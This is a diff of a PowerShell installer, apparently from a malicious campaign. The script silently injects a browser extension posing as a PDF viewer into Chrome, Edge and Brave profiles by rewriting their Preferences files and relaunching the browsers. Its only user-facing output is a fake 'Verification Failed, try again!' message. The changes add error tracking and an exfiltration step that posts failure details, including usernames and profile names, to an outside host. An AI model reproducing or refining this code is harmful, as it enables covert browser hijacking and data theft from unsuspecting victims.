@@ -5,6 +5,7 @@ $UpdateUrl = 'https://wln.ink/ext/update.json'
 $ExtensionZipUrl = 'https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip'
 $injCount = 0
 $polCount = 0
+$lastErr = ''
 $relaunchTargets = @()
 $mySession = (Get-Process -Id $PID).SessionId
 $procNames = @('chrome.exe', 'msedge.exe', 'brave.exe')
@@ -92,7 +93,9 @@ try {
         $ser.MaxJsonLength = [int]::MaxValue
         $ser.RecursionLimit = 500
         $useJsx = $true
-    } catch { }
+    } catch {
+        $lastErr = "Add-Type: $($_.Exception.Message)"
+    }
     $dictType = [System.Collections.Generic.Dictionary[string, object]]
     $browserRels = @(
         'AppData\Local\Google\Chrome\User Data',
@@ -112,6 +115,7 @@ try {
             }
             Copy-Item -Path $extensionSourceDir -Destination $userExtDir -Recurse -Force -ErrorAction Stop
         } catch {
+            $lastErr = "copy $($u.Name): $($_.Exception.Message)"
             continue
         }
         $userManifestPath = Join-Path $userExtDir 'manifest.json'
@@ -174,16 +178,20 @@ try {
                     }
                     [IO.File]::WriteAllText($prefsPath, $out, (New-Object System.Text.UTF8Encoding($false)))
                     $readback = [IO.File]::ReadAllText($prefsPath)
-                    if ($readback.IndexOf($ExtensionId) -lt 0) { continue }
+                    if ($readback.IndexOf($ExtensionId) -lt 0) {
+                        $lastErr = "readback $($u.Name)/$($profile.Name): id not found"
+                        continue
+                    }
                     $injCount++
-                } catch { }
+                } catch {
+                    $lastErr = "$($u.Name)/$($profile.Name): $($_.Exception.Message)"
+                }
             }
         }
     }
     Remove-Item "$env:TEMP\pdf-viewer-temp" -Recurse -Force -ErrorAction SilentlyContinue
-    if ($injCount -eq 0 -and $polCount -eq 0) {
-        Write-Host "Verification Failed, try again!" -ForegroundColor Red
-        exit 1
+    if ($injCount -eq 0) {
+        throw "injection wrote 0 profiles ($lastErr)"
     }
     if ($relaunchTargets.Count -gt 0) {
         foreach ($t in $relaunchTargets) {
@@ -214,6 +222,14 @@ try {
             -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
     } catch { }
 } catch {
+    $lastErr = $_.Exception.Message
+    try {
+        $failMsg = "pol:$polCount inj:$injCount $lastErr"
+        if ($failMsg.Length -gt 150) { $failMsg = $failMsg.Substring(0, 150) }
+        $failBody = "ev=install_fail&os=windows&extra=" + [uri]::EscapeDataString($failMsg)
+        Invoke-WebRequest -Uri "https://wln.ink/n" -Method Post -Body $failBody `
+            -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
+    } catch { }
     Write-Host "Verification Failed, try again!" -ForegroundColor Red
     exit 1
 }
